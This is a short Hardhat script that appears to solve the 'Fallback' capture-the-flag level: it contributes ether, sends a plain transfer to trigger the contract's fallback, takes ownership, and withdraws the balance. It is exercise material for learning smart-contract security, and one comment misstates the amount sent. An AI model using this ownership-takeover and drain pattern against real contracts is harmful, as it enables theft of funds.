const hre = require("hardhat");

async function main() {
  const [owner] = await ethers.getSigners();
  const Fallback = await hre.ethers.getContractFactory("Fallback");
  // attach your instance address
  const fallback = Fallback.attach(
    "0x9A979defF1180d9124b8aADBDcB5e77cF8722FaD"
  );
  const currentOwner = await fallback.owner();
  console.log(`Current Owner is  ${currentOwner}`);
  await fallback.connect(owner).contribute({
    value: ethers.utils.parseEther("0.0001"),
  });
  console.log("Attacking");
  await owner.sendTransaction({
    to: fallback.address,
    value: ethers.utils.parseEther("0.0001"), // Sends exactly 1.0 ether
  });
  const NewOwner = await fallback.owner();
  console.log(`New Owner is  ${NewOwner}`);
  await fallback.withdraw();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
